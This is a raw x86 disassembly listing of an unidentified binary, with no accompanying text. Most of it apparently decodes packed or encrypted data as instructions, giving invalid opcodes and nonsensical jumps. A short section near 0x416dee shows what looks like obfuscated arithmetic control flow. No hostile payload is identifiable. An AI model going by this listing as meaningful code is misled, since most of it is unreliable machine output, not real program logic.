  416b9b:	stos   BYTE PTR es:[edi],al
  416b9c:	fwait
  416b9d:	xchg   ebx,eax
  416b9e:	xor    ch,BYTE PTR [ecx-0x17c59bd1]
  416ba4:	inc    ebp
  416ba5:	stos   BYTE PTR es:[edi],al
  416ba6:	mov    edx,0x6001f1a5
  416bab:	mov    BYTE PTR [edi+0x1b1c43cd],0xee
  416bb2:	(bad)  
  416bb3:	push   0x3f6fe2f3
  416bb8:	push   esp
  416bb9:	add    bh,BYTE PTR [ecx-0x55]
  416bbc:	mov    ds:0x751d2c20,eax
  416bc1:	push   ebp
  416bc2:	or     dl,BYTE PTR [ebp-0x21]
  416bc5:	mov    edi,0x3e89a0b9
  416bca:	movhps QWORD PTR [eax],xmm2
  416bcd:	fwait
  416bce:	jno    0x416bad
  416bd0:	scas   al,BYTE PTR es:[edi]
  416bd1:	add    BYTE PTR [edi+0x32ab9abe],dl
  416bd7:	pop    ebx
  416bd8:	sar    DWORD PTR [ebp+esi*2+0x7],cl
  416bdc:	hlt    
  416bdd:	mov    dh,bh
  416bdf:	pop    ebx
  416be0:	aas    
  416be1:	lds    edi,FWORD PTR [esi-0x7c]
  416be4:	sub    ch,bh
  416be6:	jle    0x416b82
  416be8:	repz lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416beb:	cmc    
  416bec:	retf   
  416bed:	mov    esi,0xe9d75a0f
  416bf2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416bf3:	or     DWORD PTR ds:0x5a489153,0x2
  416bfa:	fwait
  416bfb:	les    eax,FWORD PTR [edx]
  416bfd:	int3   
  416bfe:	call   0xbbe4:0x4a2a9f4e
  416c05:	mov    al,BYTE PTR [esp+edx*2-0x50]
  416c09:	loopne 0x416bda
  416c0b:	imul   esi,DWORD PTR [edx],0x33
  416c0e:	retf   
  416c0f:	push   ss
  416c10:	iret   
  416c11:	pop    ecx
  416c12:	scas   eax,DWORD PTR es:[edi]
  416c13:	add    ebx,DWORD PTR [ebp+ebx*8+0x49f8fabd]
  416c1a:	dec    edi
  416c1b:	mov    BYTE PTR [ebx-0x6b36812c],bh
  416c21:	aas    
  416c22:	xchg   BYTE PTR [ebp+0x24da5631],al
  416c28:	jno    0x416bb8
  416c2a:	cmp    al,0xe7
  416c2c:	sar    DWORD PTR [eax-0x65f45279],cl
  416c32:	in     eax,dx
  416c33:	push   es
  416c34:	fwait
  416c35:	dec    ebp
  416c36:	inc    esp
  416c37:	fbld   TBYTE PTR [edi+0x2c8355]
  416c3d:	xor    BYTE PTR [edx],ah
  416c3f:	idiv   DWORD PTR [esp+eax*4+0x44]
  416c43:	xchg   ebp,eax
  416c44:	mov    ebx,0x2f9c7f19
  416c49:	ds push eax
  416c4b:	cmp    eax,0x7dc59fd3
  416c50:	and    eax,0x2fbc6df8
  416c55:	icebp  
  416c56:	push   ds
  416c57:	lock es xchg ebp,eax
  416c5a:	sbb    edi,DWORD PTR [ebx+0x5ab5a0a8]
  416c60:	push   esi
  416c61:	jecxz  0x416c17
  416c63:	mov    dh,0x58
  416c65:	jmp    0xec98f491
  416c6a:	push   esi
  416c6b:	sbb    cl,dh
  416c6d:	call   0x6275:0x185488ab
  416c74:	stc    
  416c75:	shr    eax,cl
  416c77:	out    0xb,al
  416c79:	mov    bh,0x93
  416c7b:	adc    al,0x7f
  416c7d:	add    al,0xf9
  416c7f:	adc    eax,0x504ec700
  416c84:	in     al,dx
  416c85:	sar    edi,0x31
  416c88:	sar    BYTE PTR [edi+0x5123dd1b],1
  416c8e:	sbb    edi,DWORD PTR [esi]
  416c90:	add    al,0x13
  416c92:	fiadd  WORD PTR [esi]
  416c94:	inc    edi
  416c95:	inc    ecx
  416c96:	call   0xb186:0x41df22ea
  416c9d:	jl     0x416d16
  416c9f:	add    BYTE PTR [edi-0x3291e7ec],al
  416ca5:	dec    esp
  416ca6:	mov    BYTE PTR [ebx],ah
  416ca8:	outs   dx,BYTE PTR ds:[esi]
  416ca9:	out    0xd4,al
  416cab:	pop    ebx
  416cac:	mov    ah,0x27
  416cae:	sub    BYTE PTR [ecx+0x4a],al
  416cb1:	xor    DWORD PTR [edx+ebx*2+0x5c],ebp
  416cb5:	iret   
  416cb6:	in     eax,dx
  416cb7:	xor    DWORD PTR [ebx+0x6b],ebx
  416cba:	ret    
  416cbb:	cs enter 0xf643,0xf7
  416cc0:	push   eax
  416cc1:	int    0x20
  416cc3:	cmp    BYTE PTR [esi-0x64],0xbb
  416cc7:	dec    ebx
  416cc8:	lahf   
  416cc9:	aam    0x6b
  416ccb:	aas    
  416ccc:	mov    bh,0xaa
  416cce:	repz ret 0xc1e5
  416cd2:	sbb    ch,BYTE PTR [edx-0x240ebc9a]
  416cd8:	xchg   DWORD PTR [edx+0xe],ebp
  416cdb:	jno    0x416c95
  416cdd:	push   cs
  416cde:	pop    esi
  416cdf:	xchg   ecx,eax
  416ce0:	dec    esi
  416ce1:	mov    edi,0x54ebbe2d
  416ce6:	cmp    al,0xfc
  416ce9:	mov    al,0xbd
  416ceb:	imul   edi,DWORD PTR [edx+0x2c8bb8f9],0xee37c6ae
  416cf5:	fdivr  st(1),st
  416cf7:	in     eax,0x3e
  416cf9:	inc    eax
  416cfa:	enter  0x8c81,0xd6
  416cfe:	and    ch,BYTE PTR [edx+0x6df0fff]
  416d04:	call   0xe1e4a941
  416d09:	mov    ebx,0xc612df02
  416d0e:	aam    0x88
  416d10:	mov    cl,BYTE PTR [eax+0x36]
  416d13:	xor    BYTE PTR [edx],ah
  416d15:	scas   eax,DWORD PTR es:[edi]
  416d16:	dec    edi
  416d17:	xchg   ebp,eax
  416d18:	dec    edi
  416d19:	mov    WORD PTR [ebx],gs
  416d1b:	ds aad 0xc4
  416d1e:	and    eax,edi
  416d20:	xor    esp,DWORD PTR [ecx]
  416d22:	pop    ebp
  416d23:	xlat   BYTE PTR ds:[ebx]
  416d24:	push   ebp
  416d25:	push   0x757e88af
  416d2a:	adc    eax,0xe3f05424
  416d2f:	mov    dh,0xb3
  416d31:	pop    ds
  416d32:	jo     0x416d7e
  416d34:	pop    es
  416d35:	pop    edx
  416d36:	cmp    BYTE PTR [eax+0x6],ch
  416d39:	mov    WORD PTR [eax-0x76],ss
  416d3c:	push   0x1a
  416d3e:	jmp    0xc0d6ed05
  416d43:	repz jae 0x416d64
  416d46:	rcl    BYTE PTR [edx+0x171168c7],0xef
  416d4d:	cld    
  416d4e:	xor    dl,cl
  416d50:	or     al,0xf
  416d52:	mov    ?,WORD PTR [ebx]
  416d54:	sub    ecx,DWORD PTR ds:0xf880e45d
  416d5a:	movq   QWORD PTR gs:[ebx-0xdcc4056],mm3
  416d62:	pop    eax
  416d63:	imul   ebx,eax,0xdeb399a4
  416d69:	pop    ds
  416d6a:	loop   0x416d90
  416d6c:	loopne 0x416dd3
  416d6e:	fdiv   QWORD PTR [ebx+0x14]
  416d71:	adc    dh,0x49
  416d74:	mov    dh,0xf8
  416d76:	stos   DWORD PTR es:[edi],eax
  416d77:	mov    esp,0xe973b5fb
  416d7c:	mov    ecx,0xb5b9f2ee
  416d81:	inc    ebx
  416d82:	xor    eax,0x8a47c0d3
  416d87:	push   edi
  416d88:	jg     0x416dca
  416d8a:	adc    BYTE PTR [ebx],bl
  416d8c:	pusha  
  416d8d:	push   esi
  416d8e:	in     al,dx
  416d8f:	sub    edx,DWORD PTR [ecx+0x10]
  416d92:	sbb    bh,al
  416d94:	push   cs
  416d95:	pusha  
  416d96:	inc    ebx
  416d97:	push   0xba9b434c
  416d9c:	test   BYTE PTR [eax+0x5],dh
  416d9f:	mov    ch,0xf
  416da1:	hlt    
  416da2:	stos   DWORD PTR es:[edi],eax
  416da3:	gs cmc 
  416da5:	jbe    0x416df1
  416da7:	inc    DWORD PTR cs:[edi-0x53]
  416dab:	sub    ch,BYTE PTR [ebx+0x11]
  416dae:	jp     0x416d59
  416db0:	ret    0xecd8
  416db3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416db4:	dec    esi
  416db5:	push   ebx
  416db6:	adc    BYTE PTR [edi],ah
  416db8:	rsqrtps xmm2,XMMWORD PTR [esi+0x55c98857]
  416dbf:	rcr    BYTE PTR [eax+0x3aa6e052],1
  416dc5:	retf   
  416dc6:	sub    eax,0x951df52c
  416dcb:	test   ch,bl
  416dcd:	call   0x5203:0xe41384d6
  416dd4:	gs mov al,0x67
  416dd7:	in     al,0x83
  416dd9:	loopne 0x416d64
  416ddb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416ddc:	in     eax,0x74
  416dde:	mov    ds:0x12c8c6d3,eax
  416de3:	scas   al,BYTE PTR es:[edi]
  416de4:	mov    esi,0xf15bb5eb
  416de9:	aad    0xe1
  416deb:	rcr    DWORD PTR [ebx],cl
  416ded:	pop    ecx
  416dee:	xor    edx,esi
  416df0:	add    eax,edi
  416df2:	add    edx,edi
  416df4:	imul   eax,edx
  416df7:	add    eax,DWORD PTR [ebp-0xc]
  416dfa:	mov    DWORD PTR [ebp-0xc],eax
  416dfd:	mov    eax,DWORD PTR [ebp-0xc]
  416e00:	mov    edx,DWORD PTR [ebp-0x20]
  416e03:	sub    eax,edi
  416e05:	sub    edx,edi
  416e07:	xor    eax,esi
  416e09:	xor    edx,esi
  416e0b:	cmp    edx,eax
  416e0d:	jne    0x4102d1
  416e13:	mov    eax,DWORD PTR [ebp-0x1c]
  416e16:	mov    edx,DWORD PTR [ebp-0x20]
  416e19:	xor    eax,esi
  416e1b:	add    eax,edi
  416e1d:	imul   eax,edx
  416e20:	mov    edx,DWORD PTR [ebp-0x24]
  416e23:	xor    edx,esi
  416e25:	add    edx,edi
  416e27:	or     eax,edx
  416e29:	mov    edx,DWORD PTR [ebp-0x18]
  416e2c:	xor    edx,esi
  416e2e:	add    eax,edx
  416e30:	mov    edx,DWORD PTR [ebp-0x18]
  416e33:	xor    edx,esi
  416e35:	add    eax,edx
  416e37:	mov    edx,DWORD PTR [ebp-0x10]
  416e3a:	lea    eax,[eax+edx*1+0x64e5b6]
  416e41:	jmp    0x4191ca
  416e46:	jmp    0x4191bb
  416e4b:	push   ebx
  416e4c:	ja     0x416e99
  416e4e:	cmp    BYTE PTR [ebx],ch
  416e50:	add    al,0xe3
  416e52:	adc    esp,ebp
  416e54:	xchg   edx,eax
  416e55:	push   edx
  416e56:	mov    al,0x97
  416e58:	cmp    eax,0x24b71717
  416e5d:	popa   
  416e5e:	bound  ecx,QWORD PTR [edx]
  416e60:	pop    edi
  416e61:	bound  esp,QWORD PTR [edx-0x26]
  416e64:	aad    0x49
  416e66:	mov    esp,0x2f9d1a84
  416e6b:	loopne 0x416ead
  416e6d:	and    DWORD PTR [edi-0x1e81a0ec],edx
  416e73:	popf   
  416e74:	xchg   BYTE PTR [ebp-0x4f],bl
  416e77:	in     eax,dx
  416e78:	jae    0x416ebd
  416e7a:	int3   
  416e7b:	jbe    0x416e22
  416e7d:	outs   dx,DWORD PTR ds:[esi]
  416e7e:	add    bh,dh
  416e80:	jns    0x416e80
  416e82:	sbb    dl,BYTE PTR [ebp+0xf634fe9]
  416e88:	mov    fs,WORD PTR [edx+0xb67cb0a]
  416e8e:	sub    dl,BYTE PTR [ecx]
  416e90:	nop
  416e91:	pop    ss
  416e92:	mov    ch,0x78
  416e94:	cdq    
  416e95:	lds    esp,FWORD PTR [ebx-0xd]
  416e98:	(bad)  
  416e99:	iret   
  416e9a:	inc    ebp
  416e9b:	xchg   ecx,eax
  416e9c:	aad    0xc5
  416e9e:	add    DWORD PTR [ebp-0x39a45706],esp
  416ea4:	push   0x4ce48dfc
  416ea9:	jnp    0x416f2a
  416eab:	push   0xf9b17736
  416eb0:	nop
  416eb1:	stc    
  416eb2:	lods   al,BYTE PTR ds:[esi]
  416eb3:	stos   BYTE PTR es:[edi],al
  416eb4:	xor    DWORD PTR [edi-0x4ebac6ca],edx
  416eba:	mov    ah,0xc5
  416ebc:	mov    ?,WORD PTR [edx-0x71904e40]
  416ec2:	pop    ebx
  416ec3:	add    eax,0xd6b0c31d
  416ec8:	icebp  
  416ec9:	mov    ebx,0x21912e71
  416ece:	and    bh,al
  416ed0:	test   eax,0xffee64ee
  416ed5:	aaa    
  416ed6:	test   eax,0x19406a99
  416edb:	push   eax
  416edc:	push   0x787c6cec
  416ee1:	sbb    al,dh
  416ee3:	popa   
  416ee4:	push   0x11f58a44
  416ee9:	scas   al,BYTE PTR es:[edi]
  416eea:	jne    0x416f06
  416eec:	inc    ecx
  416eed:	repnz mov bh,bh
  416ef0:	cwde   
  416ef1:	jo     0x416e9f
  416ef3:	inc    esi
  416ef4:	out    0x9e,al
  416ef6:	xor    ecx,ecx
  416ef8:	dec    ebp
  416ef9:	test   DWORD PTR [edx-0x2d],esi
  416efc:	mov    eax,0x3d61ed81
  416f01:	mov    esi,0x193e162c
  416f06:	lods   al,BYTE PTR ds:[esi]
  416f07:	(bad)  
  416f08:	fdiv   DWORD PTR [ebp+0x40471da9]
  416f0e:	xchg   ebx,eax
  416f0f:	xchg   ebp,eax
  416f10:	xchg   esi,eax
  416f11:	cmc    
  416f12:	cmp    ch,BYTE PTR [edx]
  416f14:	inc    ecx
  416f15:	in     eax,0x0
  416f17:	call   0xd415:0x1a465ce7
  416f1e:	sub    eax,0x86c58ed5
  416f23:	lods   al,BYTE PTR ds:[esi]
  416f24:	pop    ss
  416f25:	cld    
  416f26:	outs   dx,BYTE PTR ds:[esi]
  416f27:	(bad)  
  416f28:	or     al,0x10
  416f2a:	xchg   esi,eax
  416f2b:	out    dx,al
  416f2c:	sahf   
  416f2d:	das    
  416f2e:	inc    esi
  416f2f:	sar    DWORD PTR [ecx-0x492b5f53],1
  416f35:	and    edx,DWORD PTR [bx+di+0x438a]
  416f3a:	aaa    
  416f3b:	jnp    0xb2b92228
  416f41:	xchg   esp,eax
  416f42:	cdq    
  416f43:	cmp    eax,0xcf9d03f3
  416f48:	in     eax,dx
  416f49:	cmp    eax,0x2532d2e
  416f4e:	mov    eax,ds:0x8a10ee40
  416f53:	jge    0x416fd1
  416f55:	aam    0x4
  416f57:	pop    ecx
  416f58:	push   0x97f2e81e
  416f5d:	mov    bl,0x71
  416f5f:	mov    ebx,0x34bf6f7d
  416f64:	mov    bl,0x7f
  416f66:	stc    
  416f67:	xchg   esi,eax
  416f68:	and    eax,0x602bf297
  416f6d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416f6e:	xchg   ebp,eax
  416f6f:	adc    BYTE PTR [ecx+edx*4],dh
  416f72:	mov    bh,al
  416f74:	loope  0x416f27
  416f76:	cli    
  416f77:	inc    edi
  416f78:	cmp    ebp,DWORD PTR [edi-0x47]
  416f7b:	push   esi
  416f7c:	arpl   di,ax
  416f7e:	lods   al,BYTE PTR ds:[esi]
  416f7f:	or     eax,0xbf88d7ab
  416f84:	outs   dx,BYTE PTR ds:[esi]
  416f85:	xor    BYTE PTR [ecx-0x5934dfd0],dl
  416f8b:	(bad)  
  416f8c:	stc    
  416f8d:	ja     0x416f7c
  416f8f:	lahf   
  416f90:	mov    WORD PTR [edx+0x737c347b],es
  416f96:	clc    
  416f97:	icebp  
  416f98:	loope  0x416f7d
  416f9a:	pop    esp
  416f9b:	test   BYTE PTR [esi-0x1bbbd8ed],al
  416fa1:	leave  
  416fa2:	fistp  DWORD PTR [ecx]
  416fa4:	bound  ebx,QWORD PTR [eax-0x53ec5fa0]
  416faa:	add    DWORD PTR [ebx],ebp
  416fac:	mov    esp,0x8b29c3c
  416fb1:	je     0x416fa8
  416fb3:	and    cl,BYTE PTR [esi-0x47845be7]
  416fb9:	iret   
  416fba:	cli    
  416fbb:	xchg   edx,eax
  416fbc:	and    eax,0x56327d4e
  416fc1:	cwde   
  416fc2:	sbb    DWORD PTR [ecx],0x7da2ea69
  416fc8:	lahf   
  416fc9:	lahf   
  416fca:	shl    BYTE PTR [edi],1
  416fcc:	dec    esi
  416fcd:	fucom  st(2)
  416fcf:	push   es
  416fd0:	mul    ch
  416fd2:	sub    BYTE PTR [edi-0x5c],cl
  416fd5:	fwait
  416fd6:	or     eax,0x24786fe3
  416fdb:	dec    ebx
  416fdc:	cdq    
  416fdd:	jge    0x416fa6
  416fdf:	fucompp 
  416fe1:	aam    0x11
  416fe3:	jle    0x416fd2
  416fe5:	mov    WORD PTR ds:0xabc30ca2,ss
  416feb:	pop    edi
  416fec:	jl     0x416f98
  416fee:	sub    eax,0x5d14a4cd
  416ff3:	push   ss
  416ff4:	mov    ebp,0xa5fc7ef1
  416ff9:	aam    0x5e
  416ffb:	call   0x2e59:0x9384174e
  417002:	aad    0xa6
  417004:	jecxz  0x417037
  417006:	out    0x50,al
  417008:	test   ah,ch
  41700a:	mov    edi,DWORD PTR [eax]
  41700c:	xchg   ebp,eax
  41700d:	xchg   ebp,eax
  41700e:	lods   al,BYTE PTR ds:[esi]
  41700f:	xchg   esp,eax
  417010:	sbb    esp,edi
  417012:	js     0x41707c
  417014:	xor    DWORD PTR ds:[esp+eax*4+0x53b7dc94],0xc4123975
  417020:	mov    esp,DWORD PTR [edx-0x7c7ff15a]
  417026:	add    DWORD PTR [edi],ebp
  417028:	sub    DWORD PTR [esi-0x32b681d1],edx
  41702e:	xor    ecx,ecx
  417030:	and    al,BYTE PTR [eax]
  417032:	int    0x89
  417034:	adc    ecx,DWORD PTR [esi-0x76]
  417037:	adc    al,0xab
  417039:	xor    bh,BYTE PTR [edi]
  41703b:	arpl   si,bx
  41703d:	int3   
  41703e:	mov    dl,0xf6
  417040:	pop    esi
  417041:	daa    
  417042:	int3   
  417043:	scas   al,BYTE PTR es:[edi]
  417044:	cdq    
  417045:	ficomp WORD PTR [esi]
  417047:	mov    cl,0x44
  417049:	stc    
  41704a:	inc    ebx
  41704b:	ins    DWORD PTR es:[edi],dx
  41704c:	out    dx,eax
  41704d:	push   0x259e57ed
  417052:	fiadd  DWORD PTR [edx+eax*1+0x6e]
  417056:	clc    
  417057:	lods   eax,DWORD PTR ds:[esi]
  417058:	jbe    0x4170d6
  41705a:	and    BYTE PTR [esi+esi*2-0x77],0x94
  41705f:	adc    al,0xbd
  417061:	pushf  
  417062:	je     0x41708a
  417064:	jb     0x41704f
  417066:	inc    ebx
  417067:	sbb    eax,0xf084fc6a
  41706c:	outs   dx,DWORD PTR ds:[esi]
  41706d:	xor    eax,0xe09c3e9c
  417072:	pop    edi
  417073:	ins    BYTE PTR es:[edi],dx
  417074:	mov    edx,0xbf3efa20
  417079:	and    eax,0x8f780de6
  41707e:	fwait
  41707f:	outs   dx,DWORD PTR ds:[esi]
  417080:	mov    dh,0xb
  417082:	dec    esp
  417083:	std    
  417084:	mov    ecx,0xa30c2231
  41708a:	(bad)  
  41708b:	adc    bh,BYTE PTR [eax-0x2d78ccbc]
  417091:	bound  ecx,QWORD PTR [ecx-0x6e]
  417094:	jbe    0x41702b
  417096:	aam    0xdb
  417098:	(bad)  
  417099:	ret    0xabfb
  41709c:	je     0x417091
  41709e:	sub    esi,DWORD PTR [ecx]
  4170a0:	pop    edi
  4170a1:	clc    
  4170a2:	jmp    0x70:0x57ceac29
  4170a9:	mov    ds:0xc289df3,al
  4170ae:	add    al,BYTE PTR [ebx-0x56]
  4170b1:	mov    esi,esp
  4170b3:	les    edx,FWORD PTR ds:0xdf930085
  4170b9:	popa   
  4170ba:	jge    0x417074
  4170bc:	test   eax,0x1e8e3c64
  4170c1:	cli    
  4170c2:	cwde   
  4170c3:	shl    BYTE PTR [edi+0x2],cl
  4170c6:	hlt    
  4170c7:	or     BYTE PTR [eax+0x5e],dl
  4170ca:	pop    esp
  4170cb:	adc    eax,0x21661739
  4170d0:	adc    bl,BYTE PTR [ebx+eax*2+0x481630ee]
  4170d7:	das    
  4170d8:	fdivr  QWORD PTR [ebp+0x7a5d0d17]
  4170de:	(bad)  
  4170df:	fnsave [ecx+0x45]
  4170e2:	push   0xc0b8786
  4170e7:	mov    ?,WORD PTR [ecx+esi*4+0xc]
  4170eb:	push   edx
  4170ec:	push   ds
  4170ed:	out    0x6b,eax
  4170ef:	cmp    BYTE PTR [eax-0x3475e995],cl
  4170f5:	(bad)  
  4170f6:	sar    BYTE PTR [ebx-0x12f03a09],cl
  4170fc:	les    ecx,FWORD PTR [ecx]
  4170fe:	mov    al,0x8
  417100:	add    ah,ch
  417102:	or     eax,0xd4205ae
  417107:	lock jmp 0xb69e924a
  41710d:	or     DWORD PTR ds:0x9774e2b0,esi
  417113:	pusha  
  417114:	push   0xc165a85d
  417119:	scas   eax,DWORD PTR es:[edi]
  41711a:	int    0x7c
  41711c:	pushf  
  41711d:	mul    DWORD PTR [ebp+0x67]
  417120:	mov    al,ds:0x8e262eac
  417125:	mov    dh,BYTE PTR [edi+0x35f491a2]
  41712b:	cmp    edi,DWORD PTR [eax]
  41712d:	xchg   edi,eax
  41712e:	or     al,0x78
  417130:	and    edi,DWORD PTR [edx-0x30]
  417133:	or     BYTE PTR [eax-0x66d427ed],bh
  417139:	fidivr DWORD PTR [esi-0x89e48f9]
  41713f:	repz cmp ecx,0xfffffff2
  417143:	or     al,0x52
  417145:	mov    edx,0x1882dacf
  41714a:	xchg   esi,ebp
  41714c:	xchg   ebp,eax
  41714d:	jl     0x4171b2
  41714f:	scas   eax,DWORD PTR es:[edi]
  417150:	add    ah,ch
  417152:	aaa    
  417153:	add    BYTE PTR [edi],ah
  417155:	xacquire xchg BYTE PTR [esi-0x27803f92],bh
  41715c:	xor    BYTE PTR [esp+ebx*8+0x23fb82e0],0x2e
  417164:	push   ecx
  417165:	sub    ecx,edi
  417167:	xchg   edi,eax
  417168:	repnz (bad) 
  41716a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41716b:	dec    edi
  41716c:	pop    ss
  41716d:	or     eax,0x4ae04a1c
  417172:	ret    
  417173:	fiadd  WORD PTR [edi-0x35fc491f]
  417179:	fisub  DWORD PTR [edi+0x4dee5d3]
  41717f:	mov    bl,0x89
  417181:	jne    0x417179
  417183:	aam    0x9f
  417185:	sub    DWORD PTR [ebp+0x61101ad9],ebp
  41718b:	pushf  
  41718c:	sti    
  41718d:	mov    eax,ds:0xddab3b2c
  417192:	ss pop eax
  417194:	dec    eax
  417195:	jno    0x417137
  417197:	and    BYTE PTR [edi],bh
  417199:	shl    BYTE PTR [ebp-0x1c430e7b],cl
  41719f:	xor    dh,BYTE PTR [eax-0x78b2055b]
  4171a5:	out    0xf,al
  4171a7:	xchg   BYTE PTR [edx],ch
  4171a9:	outs   dx,DWORD PTR ds:[esi]
  4171aa:	sbb    ebp,0x5e
  4171ad:	outs   dx,BYTE PTR ds:[esi]
  4171ae:	js     0x4171f4
  4171b0:	push   DWORD PTR [esp+eax*1+0x9e69b62]
  4171b7:	shl    BYTE PTR [ecx-0x55],cl
  4171ba:	pop    eax
  4171bb:	call   0x4eb3:0x61f5b8ee
  4171c2:	mov    ch,0x1a
  4171c4:	cmp    eax,0x9d5fecc6
  4171c9:	pop    ecx
  4171ca:	enter  0xda8a,0x9c
  4171ce:	or     DWORD PTR [edi-0x44],0x11970f1f
  4171d5:	ds retf 
  4171d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4171d8:	mov    ?,ebp
  4171da:	ins    DWORD PTR es:[edi],dx
  4171db:	add    bl,dh
  4171dd:	test   DWORD PTR [edx-0x51],ebp
  4171e0:	xchg   edx,eax
  4171e1:	mov    cl,0x48
  4171e3:	mov    WORD PTR [ebp+0x0],cs
  4171e6:	xchg   esi,eax
  4171e7:	pop    ecx
  4171e8:	mov    bh,0xc3
  4171ea:	jge    0x4171ef
  4171ec:	dec    edi
  4171ed:	in     al,0x15
  4171ef:	sahf   
  4171f0:	imul   ecx,DWORD PTR [ecx+0x7a],0xa
  4171f4:	retf   0x2526
  4171f7:	mov    bl,0x3d
  4171f9:	inc    ecx
  4171fa:	push   eax
  4171fb:	sbb    cl,bh
  4171fd:	popf   
  4171fe:	jmp    0x4c7fe9b1
  417203:	sbb    edx,DWORD PTR [edi]
  417205:	aad    0x46
  417207:	lock dec edx
  417209:	(bad)  gs:[ebp+0x3e76824f]
  417210:	mov    cl,0xc5
  417212:	mov    al,ds:0x6087da71
  417217:	retf   
  417218:	xor    cl,bh
  41721a:	inc    ecx
  41721b:	mov    dh,0x27
  41721d:	or     BYTE PTR [ecx+0x1828c75a],cl
  417223:	or     eax,0x954cec20
  417228:	sbb    BYTE PTR [edi+0x70],al
  41722b:	in     eax,dx
  41722c:	div    DWORD PTR [edi+edx*4+0x4b]
  417230:	mov    cl,0xee
  417232:	fisubr DWORD PTR [ebx-0x5928318a]
  417238:	je     0x41720f
  41723a:	imul   esi,DWORD PTR [ebp+0x46],0xffffff83
  41723e:	cli    
  41723f:	sub    bh,BYTE PTR [ebp-0x50]
  417242:	jne    0x417283
  417244:	jmp    0x2bc40e12
  417249:	sbb    cl,al
  41724b:	fld    QWORD PTR [esi-0x25]
  41724e:	mov    bh,0xfb
  417250:	pusha  
  417251:	mov    ah,0xf
  417253:	(bad)  
  417254:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417255:	cmp    DWORD PTR [ecx],ecx
  417257:	into   
  417258:	xor    esp,ebx
  41725a:	int    0x5c
  41725c:	mov    ds:0xff6c08b3,al
  417261:	pop    edi
  417262:	inc    esi
  417263:	inc    edx
  417264:	aaa    
  417265:	push   esi
  417266:	int3   
  417267:	xchg   ebx,eax
  417268:	stos   BYTE PTR es:[edi],al
  417269:	rcr    DWORD PTR [ebx-0x1a2f0c98],1
  41726f:	cmp    BYTE PTR [ecx],cl
  417271:	jne    0x417241
  417273:	daa    
  417274:	outs   dx,BYTE PTR ds:[esi]
  417275:	jae    0x417248
  417277:	mov    cl,0x9e
  417279:	dec    ebp
  41727a:	in     al,0xcd
  41727c:	outs   dx,DWORD PTR ds:[esi]
  41727d:	cld    
  41727e:	sbb    dl,BYTE PTR [ebx-0x18]
  417281:	dec    esi
  417282:	cmp    DWORD PTR [ecx],eax
  417284:	in     al,0x4a
  417286:	and    ebx,DWORD PTR [edx+esi*2]
  417289:	cmp    BYTE PTR [ebx],ah
  41728b:	sub    ch,BYTE PTR [ebp+0x34]
  41728e:	inc    esp
  41728f:	sbb    ch,BYTE PTR [esi]
  417291:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417292:	sbb    ebx,edi
  417294:	xchg   ebp,eax
  417295:	ret    
  417296:	sub    BYTE PTR [ecx+edi*1-0x5a98ee78],ah
  41729d:	push   ss
  41729e:	pushf  
  41729f:	setg   BYTE PTR [esi+0x67]
  4172a3:	out    0x79,eax
  4172a5:	(bad)  
  4172a6:	stc    
  4172a7:	push   ds
  4172a8:	test   DWORD PTR [eax],esp
  4172aa:	shl    esi,cl
  4172ac:	cld    
  4172ad:	jno    0x4172c6
  4172af:	jns    0x41723d
  4172b1:	in     al,dx
  4172b2:	adc    dl,dh
  4172b4:	mov    edx,0xd3d55bbc
  4172b9:	mov    ebx,0x56a151d9
  4172be:	fdivp  st(5),st
  4172c0:	jle    0x4172ed
  4172c2:	je     0x417335
  4172c4:	push   0x6d
  4172c6:	and    al,0x28
  4172c8:	dec    edi
  4172c9:	xor    ecx,DWORD PTR [ebx]
  4172cb:	loop   0x41731b
  4172cd:	mov    ?,WORD PTR [esi+edi*2]
  4172d0:	xchg   DWORD PTR [eax-0x42370acb],eax
  4172d6:	push   esp
  4172d7:	(bad)
  4172da:	inc    ebx
  4172db:	push   esp
  4172dc:	repz shr BYTE PTR [esi+0x358a8ef7],1
  4172e3:	inc    esp
  4172e4:	or     DWORD PTR [edx-0x78],esp
  4172e7:	jns    0x4172bc
  4172e9:	aas    
  4172ea:	(bad)  
  4172eb:	ins    BYTE PTR es:[edi],dx
  4172ec:	enter  0x9361,0x25
  4172f0:	add    BYTE PTR [ebx+ecx*2-0x15b34473],0x79
  4172f8:	lods   eax,DWORD PTR ds:[esi]
  4172f9:	outs   dx,DWORD PTR ds:[esi]
  4172fa:	and    dh,BYTE PTR [ebx+0x3b]
  4172fd:	arpl   sp,sp
  4172ff:	arpl   WORD PTR [edx+0x7b9c0b70],si
  417305:	ret    
  417306:	jl     0x4172c5
  417308:	xchg   edi,eax
  417309:	mov    cl,0x45
  41730b:	data16 fild QWORD PTR [ecx+0x6c]
  41730f:	push   cs
  417310:	mov    al,0x4e
  417312:	jo     0x4172d2
  417314:	inc    ecx
  417315:	lds    ecx,FWORD PTR [edi+0x7fc901f2]
  41731b:	jecxz  0x41737c
  41731d:	or     edi,DWORD PTR [esi-0x18]
  417320:	outs   dx,DWORD PTR ds:[esi]
  417321:	sbb    DWORD PTR [esi-0x56],ebp
  417324:	cmp    al,0xbc
  417326:	retf   
  417327:	int3   
  417328:	jl     0x4172ab
  41732a:	add    dl,BYTE PTR [ebx-0x65160cd3]
  417330:	in     eax,dx
  417331:	dec    esi
  417332:	sub    dl,bl
  417334:	xchg   ecx,eax
  417335:	xor    ch,BYTE PTR [ebp+0x4e]
  417338:	fyl2x  
  41733a:	mov    eax,ds:0xc4508951
  41733f:	pop    eax
  417340:	jne    0x4172dd
  417342:	inc    edx
  417343:	xchg   edi,eax
  417344:	outs   dx,BYTE PTR ds:[esi]
  417345:	sar    DWORD PTR [ecx-0x5cbb5f2d],0x95
  41734c:	mov    ds:0x6e6335f6,eax
  417351:	mov    ch,0x59
  417353:	add    al,BYTE PTR [ebx]
  417355:	xchg   BYTE PTR [eax+0x4b],bh
  417358:	sar    DWORD PTR [esi+0x48864d60],1
  41735e:	and    ecx,DWORD PTR ds:0xbed181ec
  417364:	and    eax,0xfedc6ea1
  417369:	scas   al,BYTE PTR es:[edi]
  41736a:	out    dx,al
  41736b:	shl    DWORD PTR [eax+0x10],0xa4
